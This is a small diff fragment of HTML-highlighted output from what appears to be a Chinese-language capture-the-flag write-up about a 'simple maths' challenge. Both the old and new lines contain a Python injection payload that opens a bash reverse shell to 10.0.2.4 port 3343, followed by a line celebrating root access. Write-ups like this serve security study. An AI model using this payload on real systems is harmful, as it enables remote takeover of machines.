+<span class="w"> </span><span class="se">\_</span>___<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span><span class="w">   </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>
 
 
-Let's see how good you are with simple maths
-Answer my questions 1000 times and I'll give you your gift.
-(1, '*', 2)
-&gt; __import__('os').system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1&quot;')
-</code></pre>
+Let<span class="s1">&#39;s see how good you are with simple maths</span>
+<span class="s1">Answer my questions 1000 times and I&#39;</span>ll<span class="w"> </span>give<span class="w"> </span>you<span class="w"> </span>your<span class="w"> </span>gift.
+<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="s1">&#39;*&#39;</span>,<span class="w"> </span><span class="m">2</span><span class="o">)</span>
+&gt;<span class="w"> </span>__import__<span class="o">(</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1&quot;&#39;</span><span class="o">)</span>
+</code></pre></div>
 <p>窃取 root 权限成功！</p>
 
 
